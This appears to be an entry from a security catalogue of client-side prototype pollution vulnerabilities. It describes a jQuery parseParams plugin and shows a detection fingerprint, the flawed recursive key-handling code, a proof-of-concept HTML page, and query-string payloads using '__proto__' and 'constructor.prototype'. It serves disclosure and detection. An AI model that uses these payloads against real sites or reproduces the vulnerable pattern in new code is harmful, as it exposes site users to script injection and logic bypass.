## jQuery parseParams

URL: https://gist.github.com/jhjguxin/10971155

### JS Fingerprint
```
(typeof $ !== 'undefined' && typeof $.parseParams !== 'undefined')
```

### Vulnerable code fragment

https://gist.github.com/jhjguxin/10971155#file-jquery-parseparams-js-L16-L84

```js
    $.parseParams = function (query) {
        // recursive function to construct the result object
        function createElement(params, key, value) {
            key = key + '';
            // if the key is a property
            if (key.indexOf('.') !== -1) {
                // extract the first part with the name of the object
                var list = key.split('.');
                // the rest of the key
                var new_key = key.split(/\.(.+)?/)[1];
                // create the object if it doesnt exist
                if (!params[list[0]]) params[list[0]] = {};
                // if the key is not empty, create it in the object
                if (new_key !== '') {
                    createElement(params[list[0]], new_key, value);
                } else console.warn('parseParams :: empty property in key "' + key + '"');
            } else
            ...
            {
                if (!params) params = {};
                params[key] = value;
```

### PoC
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://gist.githack.com/jhjguxin/10971155/raw/f5a8625d868cca305387252dd3293864868d455d/jquery.parseparams.js"></script>
<script>
  $.parseParams(location.href);
</script>
```

```
?__proto__.test=test
?constructor.prototype.test=test
```
